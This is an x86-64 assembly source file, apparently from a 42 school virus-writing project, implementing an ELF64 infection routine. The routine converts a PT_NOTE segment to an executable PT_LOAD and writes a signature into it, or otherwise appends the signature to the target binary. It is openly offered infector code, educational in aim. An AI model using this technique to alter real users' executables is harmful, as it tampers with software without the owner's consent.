; **************************************************************************** ;
;                                                                              ;
;    infect.asm                                           :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/13 14:07:12 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/15 08:21:18 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file
extern signature
extern sig_len

global infect_binary

section .text

; =============================================================================
; infect_binary: Infecte un binaire ELF64 avec la signature
; Params: aucun (utilise current_file)
; Returns: rax = 0 si succès, -1 si erreur
; Side effects: modifie le fichier mappé en mémoire
; 
; Stratégie: Rechercher un segment PT_NOTE et le convertir en PT_LOAD
; pour y placer notre signature. C'est une méthode classique d'infection.
; =============================================================================
infect_binary:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    ; r12 = adresse du fichier mappé
    mov r12, [current_file + file_info.mapped_addr]
    
    ; Récupérer l'offset de la Program Header Table
    mov r13, [r12 + E_PHOFF]
    
    ; Récupérer le nombre de Program Headers
    movzx r14, word [r12 + E_PHNUM]
    
    ; Récupérer la taille d'un Program Header
    movzx r15, word [r12 + E_PHENTSIZE]
    
    ; Valider la table des Program Headers
    test r14, r14
    jz .no_suitable_segment
    cmp r15, PHDR_SIZE
    jb .invalid_ph_table
    test r15, r15
    jz .invalid_ph_table
    mov rax, r15
    mul r14
    cmp rdx, 0
    jne .invalid_ph_table
    mov rdi, [current_file + file_info.size]
    mov r11, r13
    add r11, rax
    jc .invalid_ph_table
    cmp r11, rdi
    ja .invalid_ph_table
    
    ; Pointer sur le premier Program Header
    lea rbx, [r12 + r13]
    
    ; Compteur de PH
    xor rcx, rcx

.search_note:
    ; Vérifier si on a parcouru tous les PH
    cmp rcx, r14
    jge .no_suitable_segment
    
    ; Vérifier le type du segment
    mov eax, dword [rbx + P_TYPE]
    cmp eax, PT_NOTE
    je .found_note
    
    ; Passer au PH suivant
    add rbx, r15
    inc rcx
    jmp .search_note

.found_note:
    ; On a trouvé un segment PT_NOTE, on va l'utiliser
    
    ; Vérifier qu'il y a assez de place
    mov rax, [rbx + P_FILESZ]
    cmp rax, [sig_len]
    jl .segment_too_small
    
    ; Convertir PT_NOTE en PT_LOAD
    mov dword [rbx + P_TYPE], PT_LOAD
    
    ; Définir les flags (R+W+X pour être sûr, on pourrait mettre juste R)
    mov dword [rbx + P_FLAGS], PF_R | PF_W | PF_X
    
    ; Récupérer l'offset du segment dans le fichier
    mov rax, [rbx + P_OFFSET]
    
    ; Copier la signature à cet emplacement
    lea rdi, [r12 + rax]        ; Destination
    mov rsi, signature          ; Source
    mov rcx, [sig_len]          ; Taille
    call memcpy
    
    ; Ajuster la taille du segment si nécessaire
    mov rax, [sig_len]
    mov [rbx + P_FILESZ], rax
    mov [rbx + P_MEMSZ], rax
    
    ; Succès
    xor rax, rax
    jmp .done

.segment_too_small:
    ; Le segment PT_NOTE est trop petit, chercher une autre méthode
    ; Pour l'instant, on considère que c'est une erreur
    jmp .try_alternative

.no_suitable_segment:
    ; Pas de segment PT_NOTE trouvé, essayer une méthode alternative
    jmp .try_alternative

.invalid_ph_table:
    ; Table des PH invalide ou incohérente
    jmp .try_alternative

.try_alternative:
    ; Méthode alternative : ajouter la signature à la fin du fichier
    ; et créer un nouveau segment PT_LOAD
    ; Pour ce projet de base, on va simplement ajouter à la fin
    
    call infect_append_method
    jmp .done

.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret

; =============================================================================
; infect_append_method: Ajoute la signature à la fin du fichier
; Params: aucun (utilise current_file, r12)
; Returns: rax = 0 si succès
; Side effects: étend le fichier
; 
; Note: Cette méthode est plus simple mais moins élégante.
; Elle écrit simplement la signature à la fin du fichier.
; =============================================================================
infect_append_method:
    push rbp
    mov rbp, rsp
    push rbx
    
    ; Obtenir le fd
    movsxd rdi, dword [current_file + file_info.fd]
    
    ; Se positionner à la fin
    mov rsi, [current_file + file_info.size]
    xor rdx, rdx                ; SEEK_SET
    mov rax, SYS_LSEEK
    syscall
    
    cmp rax, 0
    jl .error
    
    ; Écrire la signature
    movsxd rdi, dword [current_file + file_info.fd]
    mov rsi, signature
    mov rdx, [sig_len]
    mov rax, SYS_WRITE
    syscall
    
    cmp rax, 0
    jl .error
    
    mov rcx, [sig_len]
    cmp rax, rcx
    jne .error
    
    ; Mettre à jour la taille connue du fichier
    mov rbx, [current_file + file_info.size]
    add rbx, rcx
    mov [current_file + file_info.size], rbx
    
    ; Succès
    xor rax, rax
    jmp .done

.error:
    mov rax, -1

.done:
    pop rbx
    leave
    ret

; =============================================================================
; memcpy: Copie une zone mémoire
; Params: rdi = destination, rsi = source, rcx = length
; Returns: rien
; Side effects: copie rcx octets de rsi vers rdi
; =============================================================================
memcpy:
    push rax
    push rcx
    
    test rcx, rcx
    jz .done
    
.loop:
    mov al, byte [rsi]
    mov byte [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jnz .loop

.done:
    pop rcx
    pop rax
    ret
